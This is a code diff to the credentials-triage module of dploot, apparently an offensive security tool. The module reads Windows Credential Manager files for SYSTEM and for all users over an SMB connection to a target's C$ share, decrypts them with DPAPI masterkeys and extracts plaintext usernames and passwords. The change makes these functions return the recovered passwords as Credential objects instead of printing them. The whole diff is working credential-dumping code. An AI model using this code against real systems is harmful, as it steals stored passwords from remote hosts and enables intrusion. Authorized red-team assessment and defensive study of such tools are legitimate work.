@@ -1,11 +1,27 @@
 import logging
 import ntpath
-from typing import List
+from typing import Any, List
+
+from impacket.dpapi import CREDENTIAL_BLOB
 
 from dploot.lib.dpapi import decrypt_credential, find_masterkey_for_credential_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import is_credfile
+from dploot.triage.masterkeys import Masterkey
+
+class Credential:
+    def __init__(self, winuser: str, credblob: CREDENTIAL_BLOB | Any, target: str, description: str, unknown: str, username: str, password: str):
+        self.winuser = winuser
+        self.credblob = credblob
+        self.target = target
+        self.description = description
+        self.unknown = unknown
+        self.username = username
+        self.password = password
+
+    def dump(self) -> None:
+        self.credblob.dump()
 
 class CredentialsTriage:
 
@@ -25,7 +41,7 @@ class CredentialsTriage:
     ]
     share = 'C$'
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
         self.target = target
         self.conn = conn
         
@@ -34,36 +50,39 @@ class CredentialsTriage:
         self.looted_files = dict()
         self.masterkeys = masterkeys
 
-    def triage_system_credentials(self) -> None:
-        logging.info('Triage SYSTEM Credentials')
+    def triage_system_credentials(self) -> List[Credential]:
+        credentials = list()
         credential_dirs = self.conn.listDirs(self.share, self.system_credentials_generic_path)
         for system_credential_path,system_credential_dir in credential_dirs.items():
             if system_credential_dir is not None:
-                self.triage_credentials_folder(credential_folder_path=system_credential_path,credential_folder=system_credential_dir)
-        print()
+                credentials = self.triage_credentials_folder(credential_folder_path=system_credential_path,credential_folder=system_credential_dir, winuser='SYSTEM')
+        return credentials
 
-    def triage_credentials(self) -> None:
-        logging.info('Triage Credentials for ALL USERS')
+    def triage_credentials(self) -> List[Credential]:
+        credentials = list()
         for user in self.users:
             try:
-                self.triage_credentials_for_user(user)
+                credentials += self.triage_credentials_for_user(user)
             except Exception as e:
                 print(str(e))
                 pass
-        print()
+        return credentials
 
-    def triage_credentials_for_user(self,user: str) -> None:
+    def triage_credentials_for_user(self,user: str) -> List[Credential]:
+        credentials = list()
         credential_dirs = self.conn.listDirs(self.share, [elem % user for elem in self.user_credentials_generic_path])
         for user_credential_path,user_credential_dir in credential_dirs.items():
             if user_credential_dir is not None:
-                self.triage_credentials_folder(credential_folder_path=user_credential_path,credential_folder=user_credential_dir)
+                credentials += self.triage_credentials_folder(credential_folder_path=user_credential_path,credential_folder=user_credential_dir, winuser=user)
+        return credentials
 
-    def triage_credentials_folder(self, credential_folder_path,credential_folder) -> None:
+    def triage_credentials_folder(self, credential_folder_path,credential_folder, winuser: str) -> List[Credential]:
+        credentials = list()
         for d in credential_folder:
             if is_credfile(d.get_longname()):
                 cred_filename = d.get_longname()
                 cred_filename_path = ntpath.join(credential_folder_path,cred_filename)
-                logging.info("Found Credential Manager blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,cred_filename_path))
+                logging.debug("Found Credential Manager blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,cred_filename_path))
                 # read credman blob 
                 credmanblob_bytes = self.conn.readFile(self.share,cred_filename_path)
                 if credmanblob_bytes is not None and self.masterkeys is not None:
@@ -72,10 +91,19 @@ class CredentialsTriage:
                     if masterkey is not None:
                         cred = decrypt_credential(credmanblob_bytes,masterkey)
                         if cred['Unknown3'].decode('utf-16le') != '':
-                            cred.dump()
-                    else:
-                        logging.info("Could not decrypt...")
+                            credentials.append(Credential(
+                                winuser=winuser,
+                                credblob=cred,
+                                target=cred['Target'].decode('utf-16le'),
+                                description=cred['Description'].decode('utf-16le'),
+                                unknown=cred['Unknown'].decode('utf-16le'),
+                                username=cred['Username'].decode('utf-16le'),
+                                password=cred['Unknown3'].decode('utf-16le')
+                                ))
 
+                    else:
+                        logging.debug("Could not decrypt...")
+        return credentials
     @property
     def is_admin(self) -> bool:
         if self._is_admin is not None:
